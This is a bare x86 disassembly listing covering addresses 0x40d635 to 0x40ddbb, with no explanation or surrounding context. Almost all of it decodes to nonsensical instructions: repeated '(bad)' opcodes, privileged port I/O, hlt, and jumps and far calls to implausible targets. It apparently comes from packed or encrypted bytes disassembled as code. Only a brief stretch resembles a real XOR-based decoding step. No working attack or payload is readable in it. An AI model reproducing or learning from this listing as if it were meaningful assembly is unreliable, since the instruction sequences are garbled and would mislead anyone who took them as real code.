  40d635:	mov    eax,ds:0x53d9dd1b
  40d63a:	cmp    DWORD PTR [edi],ecx
  40d63c:	in     al,0x84
  40d63e:	fdivr  st(4),st
  40d640:	(bad)  
  40d641:	pop    edi
  40d642:	(bad)  
  40d643:	imul   ebp,DWORD PTR [esi+edx*2-0x33],0x13
  40d648:	cmp    eax,0x2a1cdf77
  40d64d:	dec    ebx
  40d64e:	imul   ebp,ebp,0x49
  40d651:	cmp    eax,0xac7f0cd5
  40d656:	inc    esp
  40d657:	mov    edi,cs
  40d659:	rcl    BYTE PTR [ebx],0x7d
  40d65c:	jbe    0x40d6d7
  40d65e:	mov    cl,0x7e
  40d660:	adc    BYTE PTR [ecx-0x5e],al
  40d663:	les    ebx,FWORD PTR [edi+0x129fa645]
  40d669:	pop    esi
  40d66a:	lds    edi,FWORD PTR [edx]
  40d66c:	pop    ebx
  40d66d:	xchg   ebx,eax
  40d66e:	fild   WORD PTR [eax+0x74]
  40d671:	popa   
  40d672:	test   BYTE PTR [edx],dh
  40d674:	mov    BYTE PTR [esi-0x64256010],bl
  40d67a:	loope  0x40d63a
  40d67c:	lea    ebp,[ebx-0x1cd632f3]
  40d682:	test   DWORD PTR [edx+0x182ddcc8],esp
  40d688:	inc    esi
  40d689:	sbb    ecx,DWORD PTR [eax+esi*1]
  40d68c:	xchg   edx,eax
  40d68d:	int3   
  40d68e:	sub    ebp,ebp
  40d690:	cdq    
  40d691:	mov    dh,0xe0
  40d693:	je     0x40d616
  40d695:	shl    DWORD PTR [edi+0x59],1
  40d698:	and    eax,0xd11109e
  40d69d:	cmp    eax,0x63046550
  40d6a2:	mov    edi,0x6f7051a1
  40d6a7:	fisttp DWORD PTR [ebp+0x67122358]
  40d6ad:	test   BYTE PTR [ecx-0x289d6123],dl
  40d6b3:	popf   
  40d6b4:	in     al,0xb3
  40d6b6:	mov    cl,0xa1
  40d6b8:	enter  0xcb2b,0x2
  40d6bc:	icebp  
  40d6bd:	sbb    esp,DWORD PTR [eax]
  40d6bf:	mov    esp,0xa82b0dcf
  40d6c4:	lods   al,BYTE PTR ds:[esi]
  40d6c5:	hlt    
  40d6c6:	adc    eax,0x1d937bdf
  40d6cb:	push   0x58a97996
  40d6d0:	cmp    ch,BYTE PTR [edi]
  40d6d2:	or     al,0xe0
  40d6d4:	cmp    DWORD PTR [edi-0x5a6e182a],eax
  40d6da:	in     eax,0x35
  40d6dc:	push   ecx
  40d6dd:	imul   edi
  40d6df:	mov    dl,0x74
  40d6e1:	jle    0x40d667
  40d6e3:	js     0x40d6fc
  40d6e5:	pop    ebx
  40d6e6:	inc    esi
  40d6e7:	or     DWORD PTR [ebx-0x3a97564],edx
  40d6ed:	fwait
  40d6ee:	add    al,0xc0
  40d6f0:	xchg   ebp,eax
  40d6f1:	mov    esp,0x3d57103e
  40d6f6:	push   0x4d8bd133
  40d6fb:	or     BYTE PTR [ebp+0x729d0a8c],cl
  40d701:	xor    al,BYTE PTR [eax]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	ds pop ecx
  40d73e:	jge    0x40d790
  40d740:	add    DWORD PTR [eax+0x7f3f7e7e],eax
  40d746:	jle    0x40d7c6
  40d748:	push   es
  40d749:	es das 
  40d74b:	jp     0x40d79f
  40d74d:	stos   DWORD PTR es:[edi],eax
  40d74e:	push   esp
  40d74f:	dec    ecx
  40d750:	add    BYTE PTR [ecx+eiz*4+0x60],bl
  40d754:	enter  0x7d05,0xdd
  40d758:	pop    ecx
  40d759:	mov    ecx,0xcaefa6aa
  40d75e:	dec    ebx
  40d75f:	jno    0x40d76f
  40d761:	jnp    0x40d732
  40d763:	cmp    esi,DWORD PTR [ebx-0x7286dc29]
  40d769:	retf   
  40d76a:	fnstsw WORD PTR [edi+0x2e]
  40d76d:	pop    esp
  40d76e:	sub    DWORD PTR [esi+eiz*8],0xffffffae
  40d772:	fcomp  DWORD PTR fs:[ecx+0x38]
  40d776:	icebp  
  40d777:	retf   0x8554
  40d77a:	xchg   esp,eax
  40d77b:	clc    
  40d77c:	cmp    dh,BYTE PTR [esi+0x635fee9]
  40d782:	jmp    0x40d731
  40d784:	pop    ss
  40d785:	in     eax,0x25
  40d787:	shl    BYTE PTR [edx-0x2576a8bc],0x85
  40d78e:	hlt    
  40d78f:	mov    bh,BYTE PTR [edx+0x31]
  40d792:	call   0xb49b37f9
  40d797:	or     ecx,ebp
  40d799:	outs   dx,DWORD PTR ds:[esi]
  40d79a:	jp     0x40d787
  40d79c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79d:	cdq    
  40d79e:	mov    bh,0x47
  40d7a0:	sti    
  40d7a1:	mov    ebp,0x58d8c214
  40d7a6:	shl    DWORD PTR [ebp-0x2a],1
  40d7a9:	inc    esi
  40d7aa:	sub    edi,0xdba2e805
  40d7b0:	fwait
  40d7b1:	sti    
  40d7b2:	push   esi
  40d7b3:	js     0x40d758
  40d7b5:	nop
  40d7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b7:	stos   BYTE PTR es:[edi],al
  40d7b8:	pop    es
  40d7b9:	add    ah,BYTE PTR [edx-0x7a]
  40d7bc:	imul   edi,DWORD PTR [ebp-0x31],0xc40bb692
  40d7c3:	jns    0x40d78f
  40d7c5:	push   ecx
  40d7c6:	cmp    BYTE PTR [ebx-0x6af15f27],bl
  40d7cc:	pop    ecx
  40d7cd:	push   edi
  40d7ce:	in     eax,dx
  40d7cf:	push   ds
  40d7d0:	adc    BYTE PTR [eax-0x453a56ac],ah
  40d7d6:	(bad)  
  40d7d7:	sbb    al,0xfc
  40d7d9:	add    esp,esi
  40d7db:	lock aas 
  40d7dd:	mov    dh,0x6f
  40d7df:	adc    eax,0x9320a806
  40d7e4:	ja     0x40d7cb
  40d7e6:	jge    0x40d7e5
  40d7e8:	(bad)  
  40d7e9:	and    BYTE PTR [ebp-0x24],dl
  40d7ec:	mov    dh,0xcf
  40d7ee:	std    
  40d7ef:	jne    0x40d84c
  40d7f1:	or     dh,cl
  40d7f3:	aam    0x69
  40d7f5:	call   0x5c82:0x4249afed
  40d7fc:	add    cl,BYTE PTR [eax-0x2d504405]
  40d802:	jecxz  0x40d7d7
  40d804:	dec    ecx
  40d805:	out    0x78,eax
  40d807:	dec    edx
  40d808:	xor    BYTE PTR [ebp+0x3],ah
  40d80b:	dec    eax
  40d80c:	sbb    BYTE PTR [ebp-0x5f6728c4],dl
  40d812:	xor    al,0xdc
  40d814:	rep stos BYTE PTR es:[edi],al
  40d816:	push   eax
  40d818:	mov    eax,DWORD PTR [ecx+0x2c]
  40d81b:	mov    ?,WORD PTR [ecx-0x1ca3b157]
  40d821:	cmp    cl,BYTE PTR [ebp-0x13]
  40d824:	push   es
  40d825:	bound  edi,QWORD PTR [ebx+0x6a]
  40d828:	push   0xffffffc8
  40d82a:	mov    esp,0x217f3e5a
  40d82f:	jbe    0x40d7f2
  40d831:	test   DWORD PTR [ebx-0x2e],ebp
  40d834:	dec    ebp
  40d835:	ret    
  40d836:	push   esp
  40d837:	and    al,0xb
  40d839:	xchg   esi,eax
  40d83a:	stos   BYTE PTR es:[edi],al
  40d83b:	jns    0x40d7fe
  40d83d:	addr16 (bad) 
  40d83f:	cmp    DWORD PTR [eax],edx
  40d841:	add    al,BYTE PTR [edx]
  40d843:	pop    eax
  40d844:	lods   eax,DWORD PTR ds:[esi]
  40d845:	(bad)  
  40d846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d847:	bound  eax,QWORD PTR [ebx-0x77]
  40d84a:	(bad)  
  40d84b:	cmp    al,0xd5
  40d84d:	dec    esi
  40d84e:	mov    BYTE PTR [edx+eax*2],al
  40d851:	jbe    0x40d7e2
  40d853:	cmp    ecx,DWORD PTR [ecx-0x61416f87]
  40d859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d85a:	xchg   ecx,eax
  40d85b:	aam    0x81
  40d85d:	cmp    al,0xe3
  40d85f:	lods   eax,DWORD PTR ds:[esi]
  40d860:	xor    eax,ebx
  40d862:	cwde   
  40d863:	pusha  
  40d864:	jnp    0x40d7f4
  40d866:	xor    dl,BYTE PTR [ebx]
  40d868:	mov    cl,0x7c
  40d86a:	out    0x7e,eax
  40d86c:	pop    ebp
  40d86d:	push   ds
  40d86e:	cwde   
  40d86f:	mov    ds:0xb2f0f294,al
  40d874:	mov    DWORD PTR [eax-0x6a],0xc1707c15
  40d87b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d87c:	dec    edi
  40d87d:	lock jg 0x40d8f7
  40d880:	mov    WORD PTR [ecx-0x2c772335],?
  40d886:	pop    edi
  40d887:	add    bl,BYTE PTR [edx-0x1]
  40d88a:	shl    DWORD PTR [ebx],cl
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    ebp,DWORD PTR [eax+0x31]
  40d8a0:	fs mov dl,al
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	gs inc eax
  40d8ac:	or     DWORD PTR [edx-0x10b1e9e9],esi
  40d8b2:	repnz daa 
  40d8b4:	pushf  
  40d8b5:	les    esp,FWORD PTR [esi]
  40d8b7:	adc    DWORD PTR [ebx-0x20],esi
  40d8ba:	xchg   BYTE PTR [ecx+0x77],ah
  40d8bd:	mov    edi,0x2d7e00d9
  40d8c2:	nop
  40d8c3:	sti    
  40d8c4:	and    al,0x32
  40d8c6:	push   edi
  40d8c7:	and    cl,BYTE PTR [edi]
  40d8c9:	lds    ebp,FWORD PTR [ecx]
  40d8cb:	repz push ss
  40d8cd:	test   al,0x1b
  40d8cf:	aam    0x10
  40d8d1:	mov    BYTE PTR [edx],bl
  40d8d3:	lahf   
  40d8d4:	push   edi
  40d8d5:	mov    cl,0xfb
  40d8d7:	push   ss
  40d8d8:	lea    esp,[ebx-0xb]
  40d8db:	sbb    DWORD PTR ds:0x59499076,esp
  40d8e1:	xchg   esp,eax
  40d8e2:	sub    ah,ch
  40d8e4:	xor    ebp,edi
  40d8e6:	xor    ch,BYTE PTR [edi]
  40d8e8:	xlat   BYTE PTR ds:[ebx]
  40d8e9:	call   0xed0a8c34
  40d8ee:	loop   0x40d932
  40d8f0:	xchg   esi,eax
  40d8f1:	outs   dx,DWORD PTR ds:[esi]
  40d8f2:	and    al,0x9f
  40d8f4:	sub    BYTE PTR [ecx],cl
  40d8f6:	mov    bh,0x15
  40d8f8:	lock outs dx,DWORD PTR ds:[esi]
  40d8fa:	into   
  40d8fb:	mov    DWORD PTR [ecx-0x3e72e183],eax
  40d901:	fimul  DWORD PTR [eax-0x4b03c10b]
  40d907:	and    ah,BYTE PTR [ecx+0x5]
  40d90a:	xor    DWORD PTR [eax],eax
  40d90c:	jb     0x40d938
  40d90e:	push   0x9adacf9f
  40d913:	repz jle 0x40d946
  40d916:	or     DWORD PTR cs:[ecx+0x36],edx
  40d91a:	ret    
  40d91b:	jno    0x40d918
  40d91d:	xlat   BYTE PTR ds:[ebx]
  40d91e:	ror    DWORD PTR [ebx-0x7dd771d6],0x68
  40d925:	into   
  40d926:	pop    eax
  40d927:	loop   0x40d966
  40d929:	jg     0x40d8b9
  40d92b:	xor    BYTE PTR [edx],ah
  40d92d:	xor    DWORD PTR [ebx+0x38],edi
  40d930:	mov    ebp,0xaa6f4f80
  40d935:	xchg   edi,eax
  40d936:	add    BYTE PTR [edx-0x285772bb],dh
  40d93c:	mov    edi,0xc318ceca
  40d941:	aas    
  40d942:	into   
  40d943:	mov    eax,ds:0x6430c468
  40d948:	addr16 xchg edx,eax
  40d94a:	add    edx,edi
  40d94c:	inc    edi
  40d94d:	jmp    0xc4f5:0x7c34f3f6
  40d954:	mov    al,ds:0xbc56983d
  40d959:	push   cs
  40d95a:	xchg   edi,eax
  40d95b:	fnstsw WORD PTR [ebx+0x45]
  40d95e:	push   ecx
  40d95f:	das    
  40d960:	adc    DWORD PTR [ecx],edx
  40d962:	fnsave [ecx]
  40d964:	daa    
  40d965:	adc    ebx,DWORD PTR [ecx+0x12]
  40d968:	add    BYTE PTR [ecx+0x791835c9],0xe8
  40d96f:	pop    eax
  40d970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d971:	lods   al,BYTE PTR ds:[esi]
  40d972:	jl     0x40d951
  40d974:	xor    BYTE PTR [eax+0x3e],dh
  40d977:	mov    esi,0x181f057f
  40d97c:	adc    eax,0xac6d555d
  40d981:	pop    es
  40d982:	ret    0xf363
  40d985:	stc    
  40d986:	xor    BYTE PTR [edi-0x4],0xb7
  40d98a:	or     dl,bl
  40d98c:	arpl   WORD PTR [ebx-0x56],ax
  40d98f:	cld    
  40d990:	fs (bad) 
  40d992:	aam    0xab
  40d994:	aaa    
  40d995:	xchg   edx,eax
  40d996:	push   ecx
  40d997:	dec    edi
  40d998:	dec    ebx
  40d999:	ins    DWORD PTR es:[edi],dx
  40d99a:	mov    esi,0xa21c649d
  40d99f:	dec    ebx
  40d9a0:	mov    dl,ch
  40d9a2:	mov    bl,0x25
  40d9a4:	push   ebx
  40d9a5:	ds cmc 
  40d9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9a8:	int    0x63
  40d9aa:	out    dx,eax
  40d9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9ac:	dec    ebp
  40d9ad:	cdq    
  40d9ae:	(bad)  
  40d9af:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9b1:	jg     0x40d9d5
  40d9b3:	mov    edx,0xfb40f6ce
  40d9b8:	and    BYTE PTR [edx],dl
  40d9ba:	shr    BYTE PTR [edi+0x28161f53],0x17
  40d9c1:	xchg   esi,eax
  40d9c2:	aas    
  40d9c3:	pop    edx
  40d9c4:	(bad)  
  40d9c5:	sub    DWORD PTR [ebp-0x44],ebx
  40d9c8:	inc    edx
  40d9c9:	jno    0x40d9e6
  40d9cb:	js     0x40d9bc
  40d9cd:	or     eax,0x952e2259
  40d9d2:	dec    ecx
  40d9d3:	inc    ebx
  40d9d4:	or     eax,0x6e234f5c
  40d9d9:	fwait
  40d9da:	mov    ah,0x6c
  40d9dc:	(bad)  [ecx-0x291d264f]
  40d9e2:	jmp    FWORD PTR [ebx+0x1242b68f]
  40d9e8:	in     eax,0x82
  40d9ea:	sti    
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	mov    ch,0xa9
  40d9ff:	ja     0x40da48
  40da01:	add    DWORD PTR [edx+0x7f3f7e7e],0x7e
  40da08:	jle    0x40d9a0
  40da0a:	loop   0x40d9d2
  40da0c:	repnz and ah,al
  40da0f:	fnstcw WORD PTR [edx-0x1131f3e6]
  40da15:	cmp    DWORD PTR [edx+edx*8+0x1ff912fb],esp
  40da1c:	add    eax,0x8981b30
  40da21:	add    DWORD PTR [edx+edx*1],edx
  40da24:	ins    BYTE PTR es:[edi],dx
  40da25:	test   eax,0xe081fd3e
  40da2a:	pop    ds
  40da2b:	test   BYTE PTR [ebx+0x7783eee],0xf0
  40da32:	idiv   DWORD PTR [eax+0x29b1bfec]
  40da38:	push   edx
  40da39:	leave  
  40da3a:	enter  0x3b52,0x77
  40da3e:	jp     0x40d9ff
  40da40:	xor    al,0xa9
  40da42:	mov    WORD PTR [esi],gs
  40da44:	sub    DWORD PTR [ecx-0x2e],esp
  40da47:	or     DWORD PTR [esi+0x7447bf67],ecx
  40da4d:	scas   eax,DWORD PTR es:[edi]
  40da4e:	shl    BYTE PTR [ecx],cl
  40da50:	xchg   ecx,eax
  40da51:	(bad)  
  40da52:	out    dx,al
  40da53:	loope  0x40da58
  40da55:	sbb    dh,BYTE PTR [esi-0x738c3c65]
  40da5b:	sbb    esp,0xb4e8966a
  40da61:	icebp  
  40da62:	xchg   BYTE PTR [esi-0x5],dh
  40da65:	push   ds
  40da66:	fnstenv ds:0xea73ef68
  40da6c:	cmc    
  40da6d:	lds    edx,FWORD PTR [edx]
  40da6f:	fs jb  0x40da7e
  40da72:	mov    ebp,0x7677a3ba
  40da77:	in     eax,dx
  40da78:	hlt    
  40da79:	ret    0x7f44
  40da7c:	call   0xe3ca:0xe324b0b8
  40da83:	shr    DWORD PTR [ebp-0x30d1b3bf],0xb8
  40da8a:	(bad)  [ebp+0x39]
  40da8d:	mov    ds:0xd572a759,al
  40da92:	shr    esp,0x14
  40da95:	sbb    eax,0xbef7663e
  40da9a:	or     cl,bl
  40da9c:	push   ss
  40da9d:	jnp    0x40daeb
  40da9f:	adc    al,BYTE PTR [ebp+0x7]
  40daa2:	ja     0x40da47
  40daa4:	call   0xef2e:0x87edb2e4
  40daab:	test   DWORD PTR [edi+edi*1+0x1a92a97e],0x84688649
  40dab6:	jb     0x40dadc
  40dab8:	clc    
  40dab9:	cmp    BYTE PTR [ecx+0x6cca4b13],ch
  40dabf:	push   eax
  40dac0:	xchg   al,bh
  40dac2:	xchg   esi,eax
  40dac3:	push   0xd
  40dac5:	in     al,0x21
  40dac7:	dec    edi
  40dac8:	jno    0x40db22
  40daca:	inc    esp
  40dacb:	jmp    0xf2980a70
  40dad0:	test   eax,0x242c8d7c
  40dad5:	jnp    0x40da80
  40dad7:	in     al,dx
  40dad8:	jle    0x40da81
  40dada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dadb:	pushf  
  40dadc:	loopne 0x40da6a
  40dade:	gs jp  0x40dac8
  40dae1:	cs mov esp,0x5dee5e50
  40dae7:	das    
  40dae8:	(bad)  
  40dae9:	fidiv  DWORD PTR [ebp-0x18]
  40daec:	into   
  40daed:	stos   BYTE PTR es:[edi],al
  40daee:	sub    dl,BYTE PTR [ebp+0x6fa667f6]
  40daf4:	sar    BYTE PTR [ecx+0xadb108],1
  40dafa:	cmp    esi,0x93299012
  40db00:	push   0x3e
  40db02:	add    BYTE PTR [edx+edx*8],0xdd
  40db06:	adc    dh,ch
  40db08:	sar    BYTE PTR [ebx-0x1bf3305],0x15
  40db0f:	xor    BYTE PTR [eax],0x2c
  40db12:	inc    dl
  40db14:	call   DWORD PTR [ebx]
  40db16:	int    0xde
  40db18:	cmp    DWORD PTR [edi+0x364f1a82],edi
  40db1e:	stos   DWORD PTR es:[edi],eax
  40db1f:	or     DWORD PTR [ebx+ebp*8],0xbe45bc7e
  40db26:	daa    
  40db27:	lock jmp 0x40daf0
  40db2a:	dec    edi
  40db2b:	jnp    0x40dba2
  40db2d:	and    eax,0x90391667
  40db32:	enter  0x7fa8,0xf2
  40db36:	push   eax
  40db37:	pop    edi
  40db38:	or     al,0xac
  40db3a:	lods   eax,DWORD PTR ds:[esi]
  40db3b:	js     0x40db59
  40db3d:	xchg   edi,eax
  40db3e:	ror    BYTE PTR [edx+ebp*4-0x4bff84e6],cl
  40db45:	push   esi
  40db46:	xor    esi,DWORD PTR [edx+edi*2+0x105d3953]
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	out    dx,eax
  40db65:	mov    dh,0x4b
  40db67:	ret    
  40db68:	inc    esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db25
  40db71:	mov    ch,0xf3
  40db73:	stc    
  40db74:	jne    0x40db08
  40db76:	sub    BYTE PTR [ebx+0x35],cl
  40db79:	jle    0x40db10
  40db7b:	mov    esp,0xebaf2f8e
  40db80:	mov    dl,0xfd
  40db82:	sti    
  40db83:	in     al,0x31
  40db85:	or     ebx,DWORD PTR [ebx+0x4957d06d]
  40db8b:	shl    DWORD PTR [edx+0xf],0xd1
  40db8f:	xchg   ecx,eax
  40db90:	out    0x4c,eax
  40db92:	mov    ebp,0xf4a6544c
  40db97:	xchg   ebx,eax
  40db98:	inc    ecx
  40db99:	cld    
  40db9a:	sbb    ebp,eax
  40db9c:	into   
  40db9d:	or     BYTE PTR [esi+0x3b6e773f],dh
  40dba3:	popf   
  40dba4:	les    ebp,FWORD PTR [ecx+0x6df11e52]
  40dbaa:	push   ds
  40dbab:	mov    ss,esp
  40dbad:	fwait
  40dbae:	out    0xdb,eax
  40dbb0:	mov    ebp,0xd98d8e35
  40dbb5:	cmc    
  40dbb6:	sbb    DWORD PTR [ecx+ebp*4-0x7e],edx
  40dbba:	popf   
  40dbbb:	std    
  40dbbc:	outs   dx,DWORD PTR ds:[esi]
  40dbbd:	paddusb mm1,QWORD PTR [esi+0x7bd12c83]
  40dbc4:	mov    WORD PTR ds:0x4768fadf,cs
  40dbca:	mov    esp,0xf648b95d
  40dbcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbd0:	leave  
  40dbd1:	loopne 0x40db8a
  40dbd3:	fwait
  40dbd4:	(bad)  
  40dbd5:	cmp    BYTE PTR [ecx-0x7e],bh
  40dbd8:	cmp    bl,BYTE PTR [edi+0x3c]
  40dbdb:	push   esi
  40dbdc:	pop    edi
  40dbdd:	sbb    eax,0x24ff6898
  40dbe2:	imul   esi,DWORD PTR [edi-0x68313733],0x1bb1c0d7
  40dbec:	adc    bx,WORD PTR [ebp-0x33baeed5]
  40dbf3:	adc    al,0xe
  40dbf5:	adc    ebp,edi
  40dbf7:	jne    0x40dba7
  40dbf9:	ret    
  40dbfa:	jp     0x40dc62
  40dbfc:	(bad)  
  40dbfd:	sbb    BYTE PTR [esi+0x2b],ah
  40dc00:	pop    DWORD PTR [ebx-0x6b]
  40dc03:	rcl    DWORD PTR [edi+0x1c74339b],1
  40dc09:	xchg   edx,eax
  40dc0a:	xor    dl,BYTE PTR [ecx]
  40dc0c:	dec    edi
  40dc0d:	jae    0x40dbe5
  40dc0f:	pop    ds
  40dc10:	inc    eax
  40dc11:	mov    BYTE PTR [ecx],al
  40dc13:	and    eax,DWORD PTR [ebx+0x265643d8]
  40dc19:	imul   eax,esi,0x15
  40dc1c:	mov    DWORD PTR [edi-0x42bde02f],ebp
  40dc22:	mov    bh,0x67
  40dc24:	in     eax,dx
  40dc25:	mov    esi,0xae12e3b8
  40dc2a:	sbb    al,0x4f
  40dc2c:	mov    al,ds:0xa60aef55
  40dc31:	fs call 0x7e2f5c33
  40dc37:	shl    BYTE PTR [eax-0x70c9197],cl
  40dc3d:	fwait
  40dc3e:	aas    
  40dc3f:	or     eax,0x3067d0e5
  40dc44:	mov    bl,0x73
  40dc46:	cwde   
  40dc47:	lea    esi,[ebx]
  40dc49:	hlt    
  40dc4a:	push   cs
  40dc4b:	or     bl,BYTE PTR [ecx+0x44]
  40dc4e:	adc    edx,DWORD PTR [edx]
  40dc50:	xor    eax,0x971940e6
  40dc55:	pop    ebp
  40dc56:	ret    0x28cf
  40dc59:	push   0xffffffba
  40dc5b:	push   eax
  40dc5c:	out    dx,al
  40dc5d:	and    DWORD PTR [eax-0x6b64e436],0xffffffe3
  40dc64:	in     eax,0x78
  40dc66:	clc    
  40dc67:	and    edx,DWORD PTR [ecx]
  40dc69:	pop    ss
  40dc6a:	es repz jnp 0x40dc79
  40dc6e:	iret   
  40dc6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc70:	lods   al,BYTE PTR ds:[esi]
  40dc71:	hlt    
  40dc72:	push   cs
  40dc73:	mov    ah,0xf7
  40dc75:	add    esi,DWORD PTR [ebx+0x66959bd6]
  40dc7b:	arpl   WORD PTR [edi+0x1202e7e3],cx
  40dc81:	push   ds
  40dc82:	xchg   ebp,eax
  40dc83:	xor    eax,eax
  40dc85:	pop    es
  40dc86:	and    cl,BYTE PTR [edi]
  40dc88:	cmp    cl,BYTE PTR [esp+ebx*4+0x0]
  40dc8c:	xor    dh,BYTE PTR [ebp+eax*1+0x2d]
  40dc90:	adc    dh,dl
  40dc92:	cmp    al,0x5a
  40dc94:	fist   WORD PTR [edx+0x153bfe86]
  40dc9a:	fisubr DWORD PTR [esi-0x46]
  40dc9d:	ja     0x40dd1e
  40dc9f:	addr16 xchg cl,ah
  40dca2:	dec    esp
  40dca3:	dec    eax
  40dca4:	mov    ?,WORD PTR [ebx-0x2a]
  40dca7:	aaa    
  40dca8:	cmp    eax,DWORD PTR [ebx+esi*4-0x4b3207f]
  40dcaf:	and    eax,0x59e99249
  40dcb4:	add    DWORD PTR [eax],eax
  40dcb6:	add    BYTE PTR [eax+0x15],cl
  40dcb9:	sti    
  40dcba:	retf   0xdc7b
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x582a3fe9,cl
  40dcc5:	sti    
  40dcc6:	clc    
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc6c
  40dcd0:	fwait
  40dcd1:	jg     0x40dc77
  40dcd3:	cmp    edi,ebp
  40dcd5:	pop    edi
  40dcd6:	pop    es
  40dcd7:	nop
  40dcd8:	sbb    al,0x30
  40dcda:	jns    0x40dcb4
  40dcdc:	pusha  
  40dcdd:	cmc    
  40dcde:	retf   0xe5b2
  40dce1:	fadd   QWORD PTR ds:0xb099b81
  40dce7:	shr    BYTE PTR [ebx-0x71beacaf],cl
  40dced:	aas    
  40dcee:	call   0x23933ba7
  40dcf3:	fsubr  QWORD PTR [esi]
  40dcf5:	jns    0x40dd52
  40dcf7:	mov    DWORD PTR [ebx+0x2e],ecx
  40dcfa:	shl    DWORD PTR [edx],1
  40dcfc:	and    bh,BYTE PTR [ebx]
  40dcfe:	sub    al,BYTE PTR [ecx+esi*1-0x10dafed8]
  40dd05:	popf   
  40dd06:	mov    WORD PTR [ecx-0x4feadfee],gs
  40dd0c:	out    dx,eax
  40dd0d:	hlt    
  40dd0e:	in     al,0xc1
  40dd10:	dec    ebp
  40dd11:	jle    0x40dd1b
  40dd13:	pop    ss
  40dd14:	jns    0x40dd55
  40dd16:	add    eax,0xd9df60fe
  40dd1b:	xchg   esi,eax
  40dd1c:	or     ecx,ecx
  40dd1e:	inc    edi
  40dd1f:	fs push eax
  40dd21:	and    eax,DWORD PTR [edi+0x103cce8b]
  40dd27:	out    dx,al
  40dd28:	jg     0x40dd1f
  40dd2a:	jb     0x40dd99
  40dd2c:	(bad)  
  40dd2d:	cmp    BYTE PTR [ebp-0x43c54fbd],bh
  40dd33:	lods   al,BYTE PTR ds:[esi]
  40dd34:	mov    eax,0x16ac17e6
  40dd39:	hlt    
  40dd3a:	xchg   edx,eax
  40dd3b:	in     al,0xc7
  40dd3d:	xor    DWORD PTR [ebx],eax
  40dd3f:	or     DWORD PTR [edx+0x36],eax
  40dd42:	rcr    DWORD PTR [edx-0x7284058c],0x54
  40dd49:	adc    eax,0x82bcf041
  40dd4e:	or     al,0x31
  40dd50:	dec    eax
  40dd51:	cmp    eax,0x3b19d48
  40dd56:	adc    BYTE PTR [edi],bh
  40dd58:	lahf   
  40dd59:	mov    edx,0x923f7a59
  40dd5e:	mov    eax,ds:0x2da4d9cb
  40dd63:	lock dec edi
  40dd65:	paddsw mm7,QWORD PTR [edx]
  40dd68:	xchg   edx,eax
  40dd69:	adc    bh,BYTE PTR [ebx]
  40dd6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd6c:	cmp    eax,0x42180785
  40dd71:	mov    ecx,0x8692fb36
  40dd76:	mov    WORD PTR [eax],cs
  40dd78:	cmp    BYTE PTR [esi-0x38],bl
  40dd7b:	popf   
  40dd7c:	add    eax,0xa48153c5
  40dd81:	push   esp
  40dd82:	popf   
  40dd83:	addr16 es test al,0x18
  40dd87:	inc    ebp
  40dd88:	int3   
  40dd89:	stos   BYTE PTR es:[edi],al
  40dd8a:	in     eax,dx
  40dd8b:	ins    BYTE PTR es:[edi],dx
  40dd8c:	xchg   edx,eax
  40dd8d:	out    dx,al
  40dd8e:	scas   eax,DWORD PTR es:[edi]
  40dd8f:	fld    st(6)
  40dd91:	(bad)  
  40dd92:	fist   DWORD PTR [edi+ebx*1-0x65adeeb2]
  40dd99:	je     0x40dd42
  40dd9b:	jl     0x40ddf2
  40dd9d:	jbe    0x40dddc
  40dd9f:	ds push cs
  40dda1:	dec    ebx
  40dda2:	imul   ebp,DWORD PTR [eax],0x60
  40dda5:	add    dl,BYTE PTR [edi]
  40dda7:	inc    esp
  40dda8:	xor    BYTE PTR ds:0x91e4b4d,ch
  40ddae:	xchg   esp,eax
  40ddaf:	mov    dl,0x82
  40ddb1:	sbb    edx,DWORD PTR [ecx]
  40ddb3:	dec    ecx
  40ddb4:	aas    
  40ddb5:	inc    ecx
  40ddb6:	je     0x40de24
  40ddb8:	daa    
  40ddb9:	inc    ebx
  40ddba:	popf   
  40ddbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
